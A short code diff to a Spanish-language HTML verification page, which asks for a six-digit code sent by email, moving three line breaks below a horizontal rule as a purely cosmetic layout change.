@@ -38,8 +38,9 @@
                 <div align="center">
                     <span class="ingresartxt" style="font-size: 1rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                 </div>
-                <br>    <br>    <br>
+               
                 <hr class="line1" color="#C4C4C4">
+                  <br>    <br>    <br>
                 <img class="userimg" src="archivos/Seguridad.svg">
                 <div class="floating-label">
                     <input class="pass" type="tel" placeholder=" " name="cpass" id="cpass" autocomplete="off" maxlength="6" required>
